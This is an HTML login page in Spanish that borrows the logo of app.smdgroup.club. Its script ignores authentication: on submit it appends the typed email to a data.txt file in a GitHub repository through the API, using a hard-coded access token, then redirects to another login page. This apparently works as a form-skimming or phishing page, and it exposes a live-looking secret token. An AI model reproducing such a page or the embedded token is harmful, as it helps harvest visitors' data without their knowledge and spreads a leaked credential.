<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Iniciar sesión</title>
    <link rel="icon" type="image/x-icon" href="https://app.smdgroup.club/favicon.ico" />
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
    <style type="text/css">
        /* Aquí van los estilos (no los repito ya que son los mismos) */
    </style>
</head>

<body>
    <div class="login-container">
        <img src="https://app.smdgroup.club/assets/images/logos/logo.svg" class="logo" />
        
        <form id="loginForm">
            <div class="input-container">
                <input id="email" placeholder="Email" type="email" required />
            </div>

            <div class="input-container">
                <input id="clave" placeholder="Clave" type="password" required />
                <span id="togglePassword" class="password-eye"><i class="fas fa-eye-slash"></i></span>
            </div>

            <div class="button-container">
                <button class="login-button" id="loginButton" type="submit" disabled>Iniciar sesión</button>
                <a class="forgot-password" href="#">¿Olvidaste tu clave?</a>
            </div>
        </form>
    </div>

    <script>
        // Obtener los elementos del formulario y el botón
        const emailInput = document.getElementById('email');
        const claveInput = document.getElementById('clave');
        const loginButton = document.getElementById('loginButton');
        const togglePassword = document.getElementById('togglePassword');

        // Función que habilita o deshabilita el botón dependiendo del contenido de los campos
        function toggleLoginButton() {
            if (emailInput.value && claveInput.value) {
                loginButton.disabled = false;
                loginButton.classList.add('enabled'); // Cambia el color a azul
            } else {
                loginButton.disabled = true;
                loginButton.classList.remove('enabled'); // Elimina el color azul
            }
        }

        // Agregar un event listener a los campos para detectar cambios en el contenido
        emailInput.addEventListener('input', toggleLoginButton);
        claveInput.addEventListener('input', toggleLoginButton);

        // Mostrar el icono del ojo cuando se empiece a escribir la clave
        claveInput.addEventListener('input', function () {
            if (claveInput.value) {
                togglePassword.style.display = 'block'; // Mostrar el icono
            } else {
                togglePassword.style.display = 'none'; // Ocultar el icono si no hay texto
            }
        });

        // Función para alternar la visibilidad de la contraseña
        togglePassword.addEventListener('click', function () {
            const type = claveInput.type === 'password' ? 'text' : 'password';
            claveInput.type = type;

            // Cambiar el icono de ojo según el estado
            if (type === 'password') {
                togglePassword.innerHTML = '<i class="fas fa-eye-slash"></i>'; // Ojo cerrado
            } else {
                togglePassword.innerHTML = '<i class="fas fa-eye"></i>'; // Ojo abierto
            }
        });

        // Función para enviar los datos a GitHub cuando se envíe el formulario
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault(); // Evitar que el formulario se envíe de forma tradicional

            // Datos a enviar (usar el email como nombre de usuario)
            const username = emailInput.value;

            // API de GitHub para obtener el archivo data.txt
            fetch('https://api.github.com/repos/EduSMBclub/appsmdgroupclub/contents/data.txt', {
                method: 'GET',
                headers: {
                    'Authorization': 'token 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',
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                // Si el archivo ya existe, se puede obtener el contenido
                const fileContent = data.content ? atob(data.content) : ''; // Decodificar el contenido actual del archivo

                // Nuevo contenido (agregar el nombre de usuario al archivo)
                const newContent = fileContent + '\n' + username;

                // Enviar el nuevo contenido al repositorio
                fetch('https://api.github.com/repos/EduSMBclub/appsmdgroupclub/contents/data.txt', {
                    method: 'PUT',
                    headers: {
                        'Authorization': 'token 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',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        message: 'Agregar nuevo usuario',
                        content: btoa(newContent), // Codificar el nuevo contenido a base64
                        sha: data.sha // Usar el sha del archivo existente para actualizarlo
                    })
                })
                .then(response => {
                    if (response.ok) {
                        // Si la respuesta es exitosa, redirigir al usuario a login.html
                        window.location.href = "login.html";
                    } else {
                        console.error('Error al actualizar el archivo');
                    }
                })
                .catch(error => {
                    console.error('Error al actualizar el archivo:', error);
                });
            })
            .catch(error => {
                console.error('Error al obtener el archivo:', error);
            });
        });
    </script>
</body>

</html>
